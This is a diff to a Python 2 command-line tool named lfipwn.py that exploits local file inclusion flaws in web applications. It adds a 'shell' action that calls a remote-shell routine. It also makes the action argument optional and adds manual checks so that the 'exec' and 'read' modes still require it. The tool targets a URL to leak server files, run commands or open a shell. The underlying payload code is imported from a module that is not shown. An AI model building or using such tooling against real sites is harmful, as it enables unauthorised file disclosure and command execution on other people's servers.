@@ -15,11 +15,22 @@ from core.lfi import LFI
 # argument parser
 parser = argparse.ArgumentParser(description='Exploit LFI')
 parser.add_argument('--url', '-u', nargs=1, type=str, help='URL to attack', required=True)
-parser.add_argument('--action', '-a', nargs=1, default='read', help='exec or read (default)')
-parser.add_argument('--option', '-o', nargs=1, type=str, help='Action argument', required=True)
+parser.add_argument('--action', '-a', nargs=1, default='read', help='shell, exec or read (default)')
+parser.add_argument('--option', '-o', nargs=1, type=str, help='Action argument')
 parser.add_argument('--replace', '-r', nargs=1, default='PAYLOAD', help='string to replace')
 parser.add_argument('--cookies', '-c', nargs=1, default='', help='Cookies')
 args = parser.parse_args ()
+
+# TODO : fix this hack
+# hack to look at option
+if args.action == 'exec' or args.action[0] == 'exec':
+    if args.option == None:
+        print 'lfipwn.py: error: argument --option/-o is required'
+        exit (1)
+elif args.action == 'read' or args.action[0] == 'read':
+    if args.option == None:
+        print 'lfipwn.py: error: argument --option/-o is required'
+        exit (1)
 
 attack = LFI (args.url[0], args.replace)
 if args.cookies != '':
@@ -49,6 +60,9 @@ if args.action == 'exec' or args.action[0] == 'exec':
     else:
         for result in results:
             print result
+elif args.action == 'shell' or args.action[0] == 'shell':
+    # execute command
+    results = attack.do_shell ()
 else:
     # leak file
     results = attack.do_leak (args.option[0])
